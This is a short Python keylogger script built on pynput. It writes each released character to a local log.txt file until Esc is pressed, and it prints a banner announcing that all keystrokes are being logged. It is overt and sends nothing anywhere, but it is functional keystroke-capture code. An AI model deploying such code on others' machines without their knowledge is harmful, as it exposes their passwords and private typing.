from pynput.keyboard import Key, Listener, KeyCode

with open('log.txt', 'w', encoding='utf-8') as f:

    def on_release(key: Key|KeyCode|None)-> None:
        ''' Function to handle key release events. It writes the key pressed to a file and stops the listener if the Escape key is pressed'''

        if isinstance(key, KeyCode):
            if isinstance(key.char, str):
                f.write(key.char + '\n' if hasattr(key, 'char') else str(key) + '\n')
        if isinstance(key, Key) and key == Key.esc:
            # Stop listener
            f.flush()
            f.close()
            listener.stop()

    # Collect events until released
    print(r"""
 _  ___                             
| |/ / | ___   __ _  __ _  ___ _ __ 
| ' /| |/ _ \ / _` |/ _` |/ _ \ '__|
| . \| | (_) | (_| | (_| |  __/ |   
|_|\_\_|\___/ \__, |\__, |\___|_|   
              |___/ |___/                
          """)
    print("KeyLogger is running.")
    print("You can minimize this window and continue working.")
    print("All keystrokes will be logged until you press the Esc key to stop.")
    with Listener(on_release=on_release) as listener:
        listener.join()